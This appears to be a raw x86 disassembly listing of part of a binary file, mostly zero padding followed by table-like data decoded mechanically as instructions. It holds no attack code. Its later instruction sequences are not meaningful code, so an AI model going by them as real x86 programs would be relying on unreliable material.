00006EF7  0000              add [eax],al
00006EF9  0000              add [eax],al
00006EFB  0000              add [eax],al
00006EFD  0000              add [eax],al
00006EFF  0000              add [eax],al
00006F01  0000              add [eax],al
00006F03  0000              add [eax],al
00006F05  0000              add [eax],al
00006F07  0000              add [eax],al
00006F09  0000              add [eax],al
00006F0B  0000              add [eax],al
00006F0D  0000              add [eax],al
00006F0F  0000              add [eax],al
00006F11  0000              add [eax],al
00006F13  0000              add [eax],al
00006F15  0000              add [eax],al
00006F17  0000              add [eax],al
00006F19  0000              add [eax],al
00006F1B  0000              add [eax],al
00006F1D  0000              add [eax],al
00006F1F  0000              add [eax],al
00006F21  0000              add [eax],al
00006F23  0000              add [eax],al
00006F25  0000              add [eax],al
00006F27  0000              add [eax],al
00006F29  0000              add [eax],al
00006F2B  0000              add [eax],al
00006F2D  0000              add [eax],al
00006F2F  0000              add [eax],al
00006F31  0000              add [eax],al
00006F33  0000              add [eax],al
00006F35  0000              add [eax],al
00006F37  0000              add [eax],al
00006F39  0000              add [eax],al
00006F3B  0000              add [eax],al
00006F3D  0000              add [eax],al
00006F3F  0000              add [eax],al
00006F41  0000              add [eax],al
00006F43  0000              add [eax],al
00006F45  0000              add [eax],al
00006F47  0000              add [eax],al
00006F49  0000              add [eax],al
00006F4B  0000              add [eax],al
00006F4D  0000              add [eax],al
00006F4F  0000              add [eax],al
00006F51  0000              add [eax],al
00006F53  0000              add [eax],al
00006F55  0000              add [eax],al
00006F57  0000              add [eax],al
00006F59  0000              add [eax],al
00006F5B  0000              add [eax],al
00006F5D  0000              add [eax],al
00006F5F  0000              add [eax],al
00006F61  0000              add [eax],al
00006F63  0000              add [eax],al
00006F65  0000              add [eax],al
00006F67  0000              add [eax],al
00006F69  0000              add [eax],al
00006F6B  0000              add [eax],al
00006F6D  0000              add [eax],al
00006F6F  0000              add [eax],al
00006F71  0000              add [eax],al
00006F73  0000              add [eax],al
00006F75  0000              add [eax],al
00006F77  0000              add [eax],al
00006F79  0000              add [eax],al
00006F7B  0000              add [eax],al
00006F7D  0000              add [eax],al
00006F7F  0000              add [eax],al
00006F81  0000              add [eax],al
00006F83  0000              add [eax],al
00006F85  0000              add [eax],al
00006F87  0000              add [eax],al
00006F89  0000              add [eax],al
00006F8B  0000              add [eax],al
00006F8D  0000              add [eax],al
00006F8F  0000              add [eax],al
00006F91  0000              add [eax],al
00006F93  0000              add [eax],al
00006F95  0000              add [eax],al
00006F97  0000              add [eax],al
00006F99  0000              add [eax],al
00006F9B  0000              add [eax],al
00006F9D  0000              add [eax],al
00006F9F  0000              add [eax],al
00006FA1  0000              add [eax],al
00006FA3  0000              add [eax],al
00006FA5  0000              add [eax],al
00006FA7  0000              add [eax],al
00006FA9  0000              add [eax],al
00006FAB  0000              add [eax],al
00006FAD  0000              add [eax],al
00006FAF  0000              add [eax],al
00006FB1  0000              add [eax],al
00006FB3  0000              add [eax],al
00006FB5  0000              add [eax],al
00006FB7  0000              add [eax],al
00006FB9  0000              add [eax],al
00006FBB  0000              add [eax],al
00006FBD  0000              add [eax],al
00006FBF  0000              add [eax],al
00006FC1  0000              add [eax],al
00006FC3  0000              add [eax],al
00006FC5  0000              add [eax],al
00006FC7  0000              add [eax],al
00006FC9  0000              add [eax],al
00006FCB  0000              add [eax],al
00006FCD  0000              add [eax],al
00006FCF  0000              add [eax],al
00006FD1  0000              add [eax],al
00006FD3  0000              add [eax],al
00006FD5  0000              add [eax],al
00006FD7  0000              add [eax],al
00006FD9  0000              add [eax],al
00006FDB  0000              add [eax],al
00006FDD  0000              add [eax],al
00006FDF  0000              add [eax],al
00006FE1  0000              add [eax],al
00006FE3  0000              add [eax],al
00006FE5  0000              add [eax],al
00006FE7  0000              add [eax],al
00006FE9  0000              add [eax],al
00006FEB  0000              add [eax],al
00006FED  0000              add [eax],al
00006FEF  0000              add [eax],al
00006FF1  0000              add [eax],al
00006FF3  0000              add [eax],al
00006FF5  0000              add [eax],al
00006FF7  0000              add [eax],al
00006FF9  0000              add [eax],al
00006FFB  0000              add [eax],al
00006FFD  0000              add [eax],al
00006FFF  0000              add [eax],al
00007001  0000              add [eax],al
00007003  0000              add [eax],al
00007005  0000              add [eax],al
00007007  0000              add [eax],al
00007009  0000              add [eax],al
0000700B  0000              add [eax],al
0000700D  0000              add [eax],al
0000700F  0000              add [eax],al
00007011  0000              add [eax],al
00007013  0000              add [eax],al
00007015  0000              add [eax],al
00007017  0000              add [eax],al
00007019  0000              add [eax],al
0000701B  0000              add [eax],al
0000701D  0000              add [eax],al
0000701F  0000              add [eax],al
00007021  0000              add [eax],al
00007023  0000              add [eax],al
00007025  0000              add [eax],al
00007027  0000              add [eax],al
00007029  0000              add [eax],al
0000702B  0000              add [eax],al
0000702D  0000              add [eax],al
0000702F  0000              add [eax],al
00007031  0000              add [eax],al
00007033  0000              add [eax],al
00007035  0000              add [eax],al
00007037  0000              add [eax],al
00007039  0000              add [eax],al
0000703B  0000              add [eax],al
0000703D  0000              add [eax],al
0000703F  0000              add [eax],al
00007041  0000              add [eax],al
00007043  0000              add [eax],al
00007045  0000              add [eax],al
00007047  0000              add [eax],al
00007049  0000              add [eax],al
0000704B  0000              add [eax],al
0000704D  0000              add [eax],al
0000704F  0000              add [eax],al
00007051  0000              add [eax],al
00007053  0000              add [eax],al
00007055  0000              add [eax],al
00007057  0000              add [eax],al
00007059  0000              add [eax],al
0000705B  0000              add [eax],al
0000705D  0000              add [eax],al
0000705F  0000              add [eax],al
00007061  0000              add [eax],al
00007063  0000              add [eax],al
00007065  0000              add [eax],al
00007067  0000              add [eax],al
00007069  0000              add [eax],al
0000706B  0000              add [eax],al
0000706D  0000              add [eax],al
0000706F  0000              add [eax],al
00007071  0000              add [eax],al
00007073  0000              add [eax],al
00007075  0000              add [eax],al
00007077  0000              add [eax],al
00007079  0000              add [eax],al
0000707B  0000              add [eax],al
0000707D  0000              add [eax],al
0000707F  0000              add [eax],al
00007081  0000              add [eax],al
00007083  0000              add [eax],al
00007085  0000              add [eax],al
00007087  0000              add [eax],al
00007089  0000              add [eax],al
0000708B  0000              add [eax],al
0000708D  0000              add [eax],al
0000708F  0000              add [eax],al
00007091  0000              add [eax],al
00007093  0000              add [eax],al
00007095  0000              add [eax],al
00007097  0000              add [eax],al
00007099  0000              add [eax],al
0000709B  0000              add [eax],al
0000709D  0000              add [eax],al
0000709F  0000              add [eax],al
000070A1  0000              add [eax],al
000070A3  0000              add [eax],al
000070A5  0000              add [eax],al
000070A7  0000              add [eax],al
000070A9  0000              add [eax],al
000070AB  0000              add [eax],al
000070AD  0000              add [eax],al
000070AF  0000              add [eax],al
000070B1  0000              add [eax],al
000070B3  0000              add [eax],al
000070B5  0000              add [eax],al
000070B7  0000              add [eax],al
000070B9  0000              add [eax],al
000070BB  0000              add [eax],al
000070BD  0000              add [eax],al
000070BF  0000              add [eax],al
000070C1  0000              add [eax],al
000070C3  0000              add [eax],al
000070C5  0000              add [eax],al
000070C7  0000              add [eax],al
000070C9  0000              add [eax],al
000070CB  0000              add [eax],al
000070CD  0000              add [eax],al
000070CF  0000              add [eax],al
000070D1  0000              add [eax],al
000070D3  0000              add [eax],al
000070D5  0000              add [eax],al
000070D7  0000              add [eax],al
000070D9  0000              add [eax],al
000070DB  0000              add [eax],al
000070DD  0000              add [eax],al
000070DF  0000              add [eax],al
000070E1  0000              add [eax],al
000070E3  0000              add [eax],al
000070E5  0000              add [eax],al
000070E7  0000              add [eax],al
000070E9  0000              add [eax],al
000070EB  0000              add [eax],al
000070ED  0000              add [eax],al
000070EF  0000              add [eax],al
000070F1  0000              add [eax],al
000070F3  0000              add [eax],al
000070F5  0000              add [eax],al
000070F7  0000              add [eax],al
000070F9  0000              add [eax],al
000070FB  0000              add [eax],al
000070FD  0000              add [eax],al
000070FF  0000              add [eax],al
00007101  0000              add [eax],al
00007103  0000              add [eax],al
00007105  0000              add [eax],al
00007107  0000              add [eax],al
00007109  0000              add [eax],al
0000710B  0000              add [eax],al
0000710D  0000              add [eax],al
0000710F  0000              add [eax],al
00007111  0000              add [eax],al
00007113  0000              add [eax],al
00007115  0000              add [eax],al
00007117  0000              add [eax],al
00007119  0000              add [eax],al
0000711B  0000              add [eax],al
0000711D  0000              add [eax],al
0000711F  0000              add [eax],al
00007121  0000              add [eax],al
00007123  0000              add [eax],al
00007125  0000              add [eax],al
00007127  0000              add [eax],al
00007129  0000              add [eax],al
0000712B  0000              add [eax],al
0000712D  0000              add [eax],al
0000712F  0000              add [eax],al
00007131  0000              add [eax],al
00007133  0000              add [eax],al
00007135  0000              add [eax],al
00007137  0000              add [eax],al
00007139  0000              add [eax],al
0000713B  0000              add [eax],al
0000713D  0000              add [eax],al
0000713F  0000              add [eax],al
00007141  0000              add [eax],al
00007143  0000              add [eax],al
00007145  0000              add [eax],al
00007147  0000              add [eax],al
00007149  0000              add [eax],al
0000714B  0000              add [eax],al
0000714D  0000              add [eax],al
0000714F  0000              add [eax],al
00007151  0000              add [eax],al
00007153  0000              add [eax],al
00007155  0000              add [eax],al
00007157  0000              add [eax],al
00007159  0000              add [eax],al
0000715B  0000              add [eax],al
0000715D  0000              add [eax],al
0000715F  0000              add [eax],al
00007161  0000              add [eax],al
00007163  0000              add [eax],al
00007165  0000              add [eax],al
00007167  0000              add [eax],al
00007169  0000              add [eax],al
0000716B  0000              add [eax],al
0000716D  0000              add [eax],al
0000716F  0000              add [eax],al
00007171  0000              add [eax],al
00007173  0000              add [eax],al
00007175  0000              add [eax],al
00007177  0000              add [eax],al
00007179  0000              add [eax],al
0000717B  0000              add [eax],al
0000717D  0000              add [eax],al
0000717F  0000              add [eax],al
00007181  0000              add [eax],al
00007183  0000              add [eax],al
00007185  0000              add [eax],al
00007187  0000              add [eax],al
00007189  0000              add [eax],al
0000718B  0000              add [eax],al
0000718D  0000              add [eax],al
0000718F  0000              add [eax],al
00007191  0000              add [eax],al
00007193  0000              add [eax],al
00007195  0000              add [eax],al
00007197  0000              add [eax],al
00007199  0000              add [eax],al
0000719B  0000              add [eax],al
0000719D  0000              add [eax],al
0000719F  0000              add [eax],al
000071A1  0000              add [eax],al
000071A3  0000              add [eax],al
000071A5  0000              add [eax],al
000071A7  0000              add [eax],al
000071A9  0000              add [eax],al
000071AB  0000              add [eax],al
000071AD  0000              add [eax],al
000071AF  0000              add [eax],al
000071B1  0000              add [eax],al
000071B3  0000              add [eax],al
000071B5  0000              add [eax],al
000071B7  0000              add [eax],al
000071B9  0000              add [eax],al
000071BB  0000              add [eax],al
000071BD  0000              add [eax],al
000071BF  0000              add [eax],al
000071C1  0000              add [eax],al
000071C3  0000              add [eax],al
000071C5  0000              add [eax],al
000071C7  0000              add [eax],al
000071C9  0000              add [eax],al
000071CB  0000              add [eax],al
000071CD  0000              add [eax],al
000071CF  0000              add [eax],al
000071D1  0000              add [eax],al
000071D3  0000              add [eax],al
000071D5  0000              add [eax],al
000071D7  0000              add [eax],al
000071D9  0000              add [eax],al
000071DB  0000              add [eax],al
000071DD  0000              add [eax],al
000071DF  0000              add [eax],al
000071E1  0000              add [eax],al
000071E3  0000              add [eax],al
000071E5  0000              add [eax],al
000071E7  0000              add [eax],al
000071E9  0000              add [eax],al
000071EB  0000              add [eax],al
000071ED  0000              add [eax],al
000071EF  0000              add [eax],al
000071F1  0000              add [eax],al
000071F3  0000              add [eax],al
000071F5  0000              add [eax],al
000071F7  0000              add [eax],al
000071F9  0000              add [eax],al
000071FB  0000              add [eax],al
000071FD  0000              add [eax],al
000071FF  0000              add [eax],al
00007201  0000              add [eax],al
00007203  0000              add [eax],al
00007205  0000              add [eax],al
00007207  0000              add [eax],al
00007209  0000              add [eax],al
0000720B  0000              add [eax],al
0000720D  0000              add [eax],al
0000720F  0000              add [eax],al
00007211  0000              add [eax],al
00007213  0000              add [eax],al
00007215  0000              add [eax],al
00007217  0000              add [eax],al
00007219  0000              add [eax],al
0000721B  0000              add [eax],al
0000721D  0000              add [eax],al
0000721F  0000              add [eax],al
00007221  0000              add [eax],al
00007223  0000              add [eax],al
00007225  0000              add [eax],al
00007227  0000              add [eax],al
00007229  0000              add [eax],al
0000722B  0000              add [eax],al
0000722D  0000              add [eax],al
0000722F  0000              add [eax],al
00007231  0000              add [eax],al
00007233  0000              add [eax],al
00007235  0000              add [eax],al
00007237  0000              add [eax],al
00007239  0000              add [eax],al
0000723B  0000              add [eax],al
0000723D  0000              add [eax],al
0000723F  0000              add [eax],al
00007241  0000              add [eax],al
00007243  0000              add [eax],al
00007245  0000              add [eax],al
00007247  0000              add [eax],al
00007249  0000              add [eax],al
0000724B  0000              add [eax],al
0000724D  0000              add [eax],al
0000724F  0000              add [eax],al
00007251  0000              add [eax],al
00007253  0000              add [eax],al
00007255  0000              add [eax],al
00007257  0000              add [eax],al
00007259  0000              add [eax],al
0000725B  0000              add [eax],al
0000725D  0000              add [eax],al
0000725F  0000              add [eax],al
00007261  0000              add [eax],al
00007263  0000              add [eax],al
00007265  0000              add [eax],al
00007267  0000              add [eax],al
00007269  0000              add [eax],al
0000726B  0000              add [eax],al
0000726D  0000              add [eax],al
0000726F  0000              add [eax],al
00007271  0000              add [eax],al
00007273  0000              add [eax],al
00007275  0000              add [eax],al
00007277  0000              add [eax],al
00007279  0000              add [eax],al
0000727B  0000              add [eax],al
0000727D  0000              add [eax],al
0000727F  0000              add [eax],al
00007281  0000              add [eax],al
00007283  0000              add [eax],al
00007285  0000              add [eax],al
00007287  0000              add [eax],al
00007289  0000              add [eax],al
0000728B  0000              add [eax],al
0000728D  0000              add [eax],al
0000728F  0000              add [eax],al
00007291  0000              add [eax],al
00007293  0000              add [eax],al
00007295  0000              add [eax],al
00007297  0000              add [eax],al
00007299  0000              add [eax],al
0000729B  0000              add [eax],al
0000729D  0000              add [eax],al
0000729F  0000              add [eax],al
000072A1  0000              add [eax],al
000072A3  0000              add [eax],al
000072A5  0000              add [eax],al
000072A7  0000              add [eax],al
000072A9  0000              add [eax],al
000072AB  0000              add [eax],al
000072AD  0000              add [eax],al
000072AF  0000              add [eax],al
000072B1  0000              add [eax],al
000072B3  0000              add [eax],al
000072B5  0000              add [eax],al
000072B7  0000              add [eax],al
000072B9  0000              add [eax],al
000072BB  0000              add [eax],al
000072BD  0000              add [eax],al
000072BF  0000              add [eax],al
000072C1  0000              add [eax],al
000072C3  0000              add [eax],al
000072C5  0000              add [eax],al
000072C7  0000              add [eax],al
000072C9  0000              add [eax],al
000072CB  0000              add [eax],al
000072CD  0000              add [eax],al
000072CF  0000              add [eax],al
000072D1  0000              add [eax],al
000072D3  0000              add [eax],al
000072D5  0000              add [eax],al
000072D7  0000              add [eax],al
000072D9  0000              add [eax],al
000072DB  0000              add [eax],al
000072DD  0000              add [eax],al
000072DF  0000              add [eax],al
000072E1  0000              add [eax],al
000072E3  00540000          add [eax+eax+0x0],dl
000072E7  007F32            add [edi+0x32],bh
000072EA  94                xchg eax,esp
000072EB  329932783388      xor bl,[ecx+0x88337832]
000072F1  3319              xor ebx,[ecx]
000072F3  3429              xor al,0x29
000072F5  341D              xor al,0x1d
000072F7  3584378B37        xor eax,0x378b3784
000072FC  A7                cmpsd
000072FD  38AE38173974      cmp [esi+0x74391738],ch
00007303  3B783B            cmp edi,[eax+0x3b]
00007306  7C3B              jl 0x7343
00007308  803B84            cmp byte [ebx],0x84
0000730B  3B883BA03BA4      cmp ecx,[eax+0xa43ba03b]
00007311  3BA83BAC3BB0      cmp ebp,[eax+0xb03bac3b]
00007317  3BB43BB83BBC3B    cmp esi,[ebx+edi+0x3bbc3bb8]
0000731E  C03BC4            sar byte [ebx],0xc4
00007321  3BC8              cmp ecx,eax
00007323  3BCC              cmp ecx,esp
00007325  3BD0              cmp edx,eax
00007327  3B7E3C            cmp edi,[esi+0x3c]
0000732A  863CEB            xchg bh,[ebx+ebp*8]
0000732D  3DCF3ED73E        cmp eax,0x3ed73ecf
00007332  AD                lodsd
00007333  3F                aas
00007334  0010              add [eax],dl
00007336  0000              add [eax],al
00007338  6800000013        push dword 0x13000000
0000733D  31AD338B35CD      xor [ebp+0xcd358b33],ebp
00007343  35E4350236        xor eax,0x360235e4
00007348  0C36              or al,0x36
0000734A  1B36              sbb esi,[esi]
0000734C  4D                dec ebp
0000734D  365D              ss pop ebp
0000734F  36693679368236    imul esi,[ss:esi],dword 0x36823679
00007356  D836              fdiv dword [esi]
00007358  AB                stosd
00007359  38B938BF38C3      cmp [ecx+0xc338bf38],bh
0000735F  38C8              cmp al,cl
00007361  38CE              cmp dh,cl
00007363  38D2              cmp dl,dl
00007365  38D8              cmp al,bl
00007367  38DC              cmp ah,bl
00007369  38E2              cmp dl,ah
0000736B  38E6              cmp dh,ah
0000736D  38EB              cmp bl,ch
0000736F  3831              cmp [ecx],dh
00007371  393A              cmp [edx],edi
00007373  395539            cmp [ebp+0x39],edx
00007376  68396E3977        push dword 0x77396e39
0000737B  397E39            cmp [esi+0x39],edi
0000737E  A7                cmpsd
0000737F  39C2              cmp edx,eax
00007381  39D2              cmp edx,edx
00007383  39F0              cmp eax,esi
00007385  39403A            cmp [eax+0x3a],eax
00007388  3B3B              cmp edi,[ebx]
0000738A  47                inc edi
0000738B  3B6B3C            cmp ebp,[ebx+0x3c]
0000738E  303F              xor [edi],bh
00007390  3F                aas
00007391  3F                aas
00007392  96                xchg eax,esi
00007393  3F                aas
00007394  B13F              mov cl,0x3f
00007396  B93FBF3FC5        mov ecx,0xc53fbf3f
0000739B  3F                aas
0000739C  0020              add [eax],ah
0000739E  0000              add [eax],al
000073A0  C00000            rol byte [eax],0x0
000073A3  0006              add [esi],al
000073A5  303E              xor [esi],bh
000073A7  305030            xor [eax+0x30],dl
000073AA  6330              arpl [eax],si
000073AC  9F                lahf
000073AD  3032              xor [edx],dh
000073AF  3448              xor al,0x48
000073B1  34C8              xor al,0xc8
000073B3  37                aaa
000073B4  E037              loopne 0x73ed
000073B6  E737              out 0x37,eax
000073B8  EF                out dx,eax
000073B9  37                aaa
000073BA  F4                hlt
000073BB  37                aaa
000073BC  F8                clc
000073BD  37                aaa
000073BE  FC                cld
000073BF  37                aaa
000073C0  25384B3865        and eax,0x65384b38
000073C5  386C3870          cmp [eax+edi+0x70],ch
000073C9  38743878          cmp [eax+edi+0x78],dh
000073CD  387C3880          cmp [eax+edi-0x80],bh
000073D1  3884388838D238    cmp [eax+edi+0x38d23888],al
000073D8  D838              fdivr dword [eax]
000073DA  DC38              fdivr qword [eax]
000073DC  E038              loopne 0x7416
000073DE  E438              in al,0x38
000073E0  4A                dec edx
000073E1  395539            cmp [ebp+0x39],edx
000073E4  7039              jo 0x741f
000073E6  7739              ja 0x7421
000073E8  7C39              jl 0x7423
000073EA  803984            cmp byte [ecx],0x84
000073ED  39A139CB39FD      cmp [ecx+0xfd39cb39],esp
000073F3  39043A            cmp [edx+edi],eax
000073F6  083A              or [edx],bh
000073F8  0C3A              or al,0x3a
000073FA  103A              adc [edx],bh
000073FC  143A              adc al,0x3a
000073FE  183A              sbb [edx],bh
00007400  1C3A              sbb al,0x3a
00007402  203A              and [edx],bh
00007404  6A3A              push byte +0x3a
00007406  703A              jo 0x7442
00007408  743A              jz 0x7444
0000740A  783A              js 0x7446
0000740C  7C3A              jl 0x7448
0000740E  5A                pop edx
0000740F  3B5F3B            cmp ebx,[edi+0x3b]
00007412  7B3B              jpo 0x744f
00007414  8E3B              mov segr7,[ebx]
00007416  95                xchg eax,ebp
00007417  3BA73BAF3BBF      cmp esp,[edi+0xbf3baf3b]
0000741D  3BD0              cmp edx,eax
0000741F  3BE3              cmp esp,ebx
00007421  3BFB              cmp edi,ebx
00007423  3B1B              cmp ebx,[ebx]
00007425  3C71              cmp al,0x71
00007427  3C83              cmp al,0x83
00007429  3CA7              cmp al,0xa7
0000742B  3CAF              cmp al,0xaf
0000742D  3CDC              cmp al,0xdc
0000742F  3CF7              cmp al,0xf7
00007431  3C07              cmp al,0x7
00007433  3D0D3D193D        cmp eax,0x3d193d0d
00007438  1E                push ds
00007439  3D3D3D4A3D        cmp eax,0x3d4a3d3d
0000743E  57                push edi
0000743F  3D613D6B3D        cmp eax,0x3d6b3d61
00007444  733D              jnc 0x7483
00007446  813D9F3DBC3DD43D  cmp dword [0x3dbc3d9f],0x3df43dd4
         -F43D
00007450  4C                dec esp
00007451  3E623E            bound edi,[ds:esi]
00007454  95                xchg eax,ebp
00007455  3EFD              ds std
00007457  3E223F            and bh,[ds:edi]
0000745A  0000              add [eax],al
0000745C  0030              add [eax],dh
0000745E  0000              add [eax],al
00007460  D800              fadd dword [eax]
00007462  0000              add [eax],al
00007464  69318031CB31      imul esi,[ecx],dword 0x31cb3180
0000746A  2332              and esi,[edx]
0000746C  42                inc edx
0000746D  325B32            xor bl,[ebx+0x32]
00007470  8B32              mov esi,[edx]
00007472  B332              mov bl,0x32
00007474  CC                int3
00007475  3211              xor dl,[ecx]
00007477  332D33FE3316      xor ebp,[0x1633fe33]
0000747D  3448              xor al,0x48
0000747F  3460              xor al,0x60
00007481  34A4              xor al,0xa4
00007483  35A835AC35        xor eax,0x35ac35a8
00007488  B035              mov al,0x35
0000748A  B435              mov ah,0x35
0000748C  B835BC35C0        mov eax,0xc035bc35
00007491  35C435C835        xor eax,0x35c835c4
00007496  CC                int3
00007497  35D0358236        xor eax,0x368235d0
0000749C  9C                pushf
0000749D  36AD              ss lodsd
0000749F  36CA3669          ss retf 0x6936
000074A3  388538C838E0      cmp [ebp+0xe038c838],al
000074A9  38E7              cmp bh,ah
000074AB  38EF              cmp bh,ch
000074AD  38F4              cmp ah,dh
000074AF  38F8              cmp al,bh
000074B1  38FC              cmp ah,bh
000074B3  3825394B3965      cmp [0x65394b39],ah
000074B9  396C3970          cmp [ecx+edi+0x70],ebp
000074BD  39743978          cmp [ecx+edi+0x78],esi
000074C1  397C3980          cmp [ecx+edi-0x80],edi
000074C5  3984398839D239    cmp [ecx+edi+0x39d23988],eax
000074CC  D839              fdivr dword [ecx]
000074CE  DC39              fdivr qword [ecx]
000074D0  E039              loopne 0x750b
000074D2  E439              in al,0x39
000074D4  4A                dec edx
000074D5  3A553A            cmp dl,[ebp+0x3a]
000074D8  703A              jo 0x7514
000074DA  773A              ja 0x7516
000074DC  7C3A              jl 0x7518
000074DE  803A84            cmp byte [edx],0x84
000074E1  3AA13ACB3AFD      cmp ah,[ecx+0xfd3acb3a]
000074E7  3A043B            cmp al,[ebx+edi]
000074EA  083B              or [ebx],bh
000074EC  0C3B              or al,0x3b
000074EE  103B              adc [ebx],bh
000074F0  143B              adc al,0x3b
000074F2  183B              sbb [ebx],bh
000074F4  1C3B              sbb al,0x3b
000074F6  203B              and [ebx],bh
000074F8  6A3B              push byte +0x3b
000074FA  703B              jo 0x7537
000074FC  743B              jz 0x7539
000074FE  783B              js 0x753b
00007500  7C3B              jl 0x753d
00007502  C7                db 0xC7
00007503  3B0A              cmp ecx,[edx]
00007505  3C44              cmp al,0x44
00007507  3C4A              cmp al,0x4a
00007509  3C6D              cmp al,0x6d
0000750B  3C79              cmp al,0x79
0000750D  3C80              cmp al,0x80
0000750F  3C90              cmp al,0x90
00007511  3C96              cmp al,0x96
00007513  3C9D              cmp al,0x9d
00007515  3CA7              cmp al,0xa7
00007517  3CC0              cmp al,0xc0
00007519  3CC8              cmp al,0xc8
0000751B  3CCD              cmp al,0xcd
0000751D  3CD9              cmp al,0xd9
0000751F  3CDE              cmp al,0xde
00007521  3CFB              cmp al,0xfb
00007523  3C01              cmp al,0x1
00007525  3D403D813D        cmp eax,0x3d813d40
0000752A  EA3D043E0D3E7B    jmp 0x7b3e:0xd3e043d
00007531  3F                aas
00007532  813F00400000      cmp dword [edi],0x4000
00007538  A4                movsb
00007539  0000              add [eax],al
0000753B  0002              add [edx],al
0000753D  3416              xor al,0x16
0000753F  3477              xor al,0x77
00007541  3486              xor al,0x86
00007543  3498              xor al,0x98
00007545  34BE              xor al,0xbe
00007547  34CB              xor al,0xcb
00007549  34D9              xor al,0xd9
0000754B  34E4              xor al,0xe4
0000754D  34F7              xor al,0xf7
0000754F  341E              xor al,0x1e
00007551  352D356F35        xor eax,0x356f352d
00007556  8335A135AD35C9    xor dword [0x35ad35a1],byte -0x37
0000755D  35DE35F435        xor eax,0x35f435de
00007562  FB                sti
00007563  3503361E36        xor eax,0x361e3603
00007568  26367538          ss jnz 0x75a4
0000756C  833889            cmp dword [eax],byte -0x77
0000756F  38A338A838B7      cmp [ebx+0xb738a838],ah
00007575  38BD38CD38D8      cmp [ebp+0xd838cd38],bh
0000757B  38EA              cmp dl,ch
0000757D  38FD              cmp ch,bh
0000757F  3808              cmp [eax],cl
00007581  390E              cmp [esi],ecx
00007583  3913              cmp [ebx],edx
00007585  3919              cmp [ecx],ebx
00007587  3926              cmp [esi],esp
00007589  394339            cmp [ebx+0x39],eax
0000758C  49                dec ecx
0000758D  3954395A          cmp [ecx+edi+0x5a],edx
00007591  3964396A          cmp [ecx+edi+0x6a],esp
00007595  397A39            cmp [edx+0x39],edi
00007598  8039C4            cmp byte [ecx],0xc4
0000759B  396A3A            cmp [edx+0x3a],ebp
0000759E  57                push edi
0000759F  3C62              cmp al,0x62
000075A1  3C6A              cmp al,0x6a
000075A3  3C7D              cmp al,0x7d
000075A5  3C83              cmp al,0x83
000075A7  3C99              cmp al,0x99
000075A9  3CA0              cmp al,0xa0
000075AB  3CA6              cmp al,0xa6
000075AD  3CB0              cmp al,0xb0
000075AF  3CB6              cmp al,0xb6
000075B1  3CBB              cmp al,0xbb
000075B3  3CC1              cmp al,0xc1
000075B5  3CD1              cmp al,0xd1
000075B7  3CDA              cmp al,0xda
000075B9  3CF4              cmp al,0xf4
000075BB  3C05              cmp al,0x5
000075BD  3D0B3D1E3D        cmp eax,0x3d1e3d0b
000075C2  803D3E3E863E8C    cmp byte [0x3e863e3e],0x8c
000075C9  3E9A3EE93E193F74  ds call 0x743f:0x193ee93e
000075D1  3F                aas
000075D2  7A3F              jpe 0x7613
000075D4  883F              mov [edi],bh
000075D6  E63F              out 0x3f,al
000075D8  005000            add [eax+0x0],dl
000075DB  00A00000001E      add [eax+0x1e000000],ah
000075E1  303A              xor [edx],bh
000075E3  304730            xor [edi+0x30],al
000075E6  54                push esp
000075E7  306730            xor [edi+0x30],ah
000075EA  7030              jo 0x761c
000075EC  7C30              jl 0x761e
000075EE  AE                scasb
000075EF  30C0              xor al,al
000075F1  30CF              xor bh,cl
000075F3  30F0              xor al,dh
000075F5  30F6              xor dh,dh
000075F7  3017              xor [edi],dl
000075F9  3121              xor [ecx],esp
000075FB  312C31            xor [ecx+esi],ebp
000075FE  3131              xor [ecx],esi
00007600  3931              cmp [ecx],esi
00007602  50                push eax
00007603  316531            xor [ebp+0x31],esp
00007606  6B3173            imul esi,[ecx],byte +0x73
00007609  317B31            xor [ebx+0x31],edi
0000760C  8631              xchg dh,[ecx]
0000760E  B431              mov ah,0x31
00007610  C0                db 0xC0
00007611  31CA              xor edx,ecx
00007613  31D5              xor ebp,edx
00007615  31DF              xor edi,ebx
00007617  31E9              xor ecx,ebp
00007619  31EF              xor edi,ebp
0000761B  3132              xor [edx],esi
0000761D  323C32            xor bh,[edx+esi]
00007620  41                inc ecx
00007621  324632            xor al,[esi+0x32]
00007624  4B                dec ebx
00007625  3264326A          xor ah,[edx+esi+0x6a]
00007629  32D9              xor bl,cl
0000762B  32DF              xor bl,bh
0000762D  32FD              xor bh,ch
0000762F  320E              xor cl,[esi]
00007631  3321              xor esp,[ecx]
00007633  3336              xor esi,[esi]
00007635  33543362          xor edx,[ebx+esi+0x62]
00007639  336F33            xor ebp,[edi+0x33]
0000763C  7F33              jg 0x7671
0000763E  A033AC33BE        mov al,[0xbe33ac33]
00007643  33CC              xor ecx,esp
00007645  33DB              xor ebx,ebx
00007647  33EC              xor ebp,esp
00007649  33FA              xor edi,edx
0000764B  3303              xor eax,[ebx]
0000764D  3409              xor al,0x9
0000764F  3415              xor al,0x15
00007651  341A              xor al,0x1a
00007653  3424              xor al,0x24
00007655  342B              xor al,0x2b
00007657  3433              xor al,0x33
00007659  3439              xor al,0x39
0000765B  3440              xor al,0x40
0000765D  3445              xor al,0x45
0000765F  3456              xor al,0x56
00007661  3472              xor al,0x72
00007663  347E              xor al,0x7e
00007665  368437            test [ss:edi],dh
00007668  8837              mov [edi],dh
0000766A  94                xchg eax,esp
0000766B  37                aaa
0000766C  98                cwde
0000766D  37                aaa
0000766E  A037A4371C        mov al,[0x1c37a437]
00007673  3F                aas
00007674  B03F              mov al,0x3f
00007676  B43F              mov ah,0x3f
00007678  006000            add [eax+0x0],ah
0000767B  00C0              add al,al
0000767D  0000              add [eax],al
0000767F  0018              add [eax],bl
00007681  301C30            xor [eax+esi],bl
00007684  2030              and [eax],dh
00007686  2430              and al,0x30
00007688  2830              sub [eax],dh
0000768A  2C30              sub al,0x30
0000768C  3030              xor [eax],dh
0000768E  3430              xor al,0x30
00007690  3830              cmp [eax],dh
00007692  48                dec eax
00007693  304C3094          xor [eax+esi-0x6c],cl
00007697  32B432C432D432    xor dh,[edx+esi+0x32d432c4]
0000769E  5C                pop esp
0000769F  34AC              xor al,0xac
000076A1  36B436            ss mov ah,0x36
000076A4  BC36C436CC        mov esp,0xcc36c436
000076A9  36D436            ss aam 0x36
000076AC  DC36              fdiv qword [esi]
000076AE  E436              in al,0x36
000076B0  EC                in al,dx
000076B1  36F4              ss hlt
000076B3  36FC              ss cld
000076B5  360437            ss add al,0x37
000076B8  0C37              or al,0x37
000076BA  1437              adc al,0x37
000076BC  1C37              sbb al,0x37
000076BE  2437              and al,0x37
000076C0  2C37              sub al,0x37
000076C2  3437              xor al,0x37
000076C4  3C37              cmp al,0x37
000076C6  40                inc eax
000076C7  37                aaa
